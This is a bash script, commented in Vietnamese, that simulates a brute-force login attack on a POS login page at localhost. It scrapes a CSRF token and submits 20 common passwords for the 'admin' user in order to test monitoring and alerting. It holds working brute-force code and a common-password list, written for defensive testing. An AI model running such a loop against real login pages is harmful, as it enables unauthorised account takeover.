#!/bin/bash
# ==============================================================================
# Script: simulate_bruteforce.sh
# Purpose: Mo phong tan cong do mat khau (Brute Force) vao trang dang nhap POS
#          phuc vu muc dich hoc tap va kiem thu he thong giam sat / canh bao.
# ==============================================================================
set -e

TARGET_URL="https://localhost"
LOGIN_PAGE="${TARGET_URL}/login.php"
COOKIE_JAR="/tmp/pos_bf_cookies.txt"
TARGET_USER="admin"
COUNT=20

echo "============================================================"
echo " [!] SIMULATING BRUTE-FORCE LOGIN ATTACK"
echo " Target URL : ${LOGIN_PAGE}"
echo " Target User: ${TARGET_USER}"
echo " Attempts   : ${COUNT} requests"
echo " Start Time : $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
echo "============================================================"

# Danh sach mat khau thu nghiem
PASSWORDS=(
    "123456" "password" "admin123" "welcome" "qwerty"
    "letmein" "monkey" "dragon" "sunshine" "princess"
    "football" "master" "shadow" "superman" "trustno1"
    "killer" "hunter2" "testing" "root123" "wrongpass99"
)

SUCCESSFUL_ATTEMPTS=0

for i in $(seq 1 $COUNT); do
    CURRENT_PASS="${PASSWORDS[$((i-1))]}"
    
    # 1. Lay token CSRF va cookie session
    CSRF_TOKEN=$(curl -sk -c "$COOKIE_JAR" "$LOGIN_PAGE" | grep 'name="csrf_token"' | sed -E 's/.*value="([^"]+)".*/\1/')
    
    if [ -z "$CSRF_TOKEN" ]; then
        echo "[-] Attempt #$i: Failed to extract CSRF token"
        continue
    fi
    
    TIMESTAMP=$(date -u '+%Y-%m-%d %H:%M:%S')
    
    # 2. Gui request dang nhap voi mat khau sai
    HTTP_CODE=$(curl -sk -b "$COOKIE_JAR" -c "$COOKIE_JAR" -X POST "$LOGIN_PAGE" \
        -d "csrf_token=${CSRF_TOKEN}" \
        -d "username=${TARGET_USER}" \
        -d "password=${CURRENT_PASS}" \
        -o /dev/null -w "%{http_code}")
        
    echo "[+] Attempt #$i | Time: $TIMESTAMP UTC | User: $TARGET_USER | Pass: $CURRENT_PASS | HTTP: $HTTP_CODE"
    SUCCESSFUL_ATTEMPTS=$((SUCCESSFUL_ATTEMPTS + 1))
    
    rm -f "$COOKIE_JAR"
    sleep 0.5
done

echo "============================================================"
echo "[+] Simulation finished: sent $SUCCESSFUL_ATTEMPTS failed login attempts."
echo "============================================================"
